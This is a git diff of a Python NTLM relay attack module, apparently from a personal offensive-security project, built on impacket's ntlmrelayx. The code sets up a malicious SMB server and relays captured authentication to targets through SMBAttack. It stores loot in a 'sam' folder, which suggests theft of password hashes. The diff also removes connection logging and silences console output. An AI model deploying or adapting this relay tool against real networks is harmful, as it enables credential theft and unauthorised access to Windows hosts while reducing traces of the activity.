@@ -8,6 +8,8 @@ from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
 from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
+import contextlib
+import sys
 
 
 class MaliciousSmbServer(SimpleSMBServer):
@@ -55,7 +57,12 @@ class MaliciousSmbServer(SimpleSMBServer):
         super().start()
 
 
-class NtlmRelayServer:
+class NoOutput(object):
+    def write(self, x):
+        pass
+
+
+class NtlmRelayAttack:
     def __init__(self, lhost: str, port: str, rhost: str, asynchronous: bool):
         self.__lhost = lhost
         self.__port = port
@@ -63,7 +70,6 @@ class NtlmRelayServer:
         self.__attacks = {"SMB": SMBAttack}
         self.__clients = {"SMB": SMBRelayClient}
         self.__asynchronous = asynchronous
-        self.output_of_connections()
 
     @property
     def lhost(self) -> str:
@@ -97,12 +103,12 @@ class NtlmRelayServer:
     def lhost(self, lhost: str) -> None:
         self.__lhost = lhost
 
-    def output_of_connections(self) -> None:
-        logger.add(
-            "logs/ntlm_relay.log",
-            level="INFO",
-            rotation="1 week",
-        )
+    @contextlib.contextmanager
+    def no_stdout(self):
+        save = sys.stdout
+        sys.stdout = NoOutput()
+        yield
+        sys.stdout = save
 
     def start_ntlm_relay_server(self) -> None:
         if self.asynchronous:
@@ -122,8 +128,14 @@ class NtlmRelayServer:
         config.setAttacks(self.attacks)
         config.setProtocolClients(self.clients)
         config.setSMB2Support(True)
+        config.setLootdir("/home/rsgbengi/Igris/project/ManInTheMiddle/sam")
         config.interfaceIp = self.lhost
         server = SMBRelayServer(config)
         server.daemon = True
-        server.start()
+        if self.__asynchronous:
+            # with self.no_stdout():
+            sys.stdout = NoOutput()
+            server.start()
+        else:
+            server.start()
         server.join()
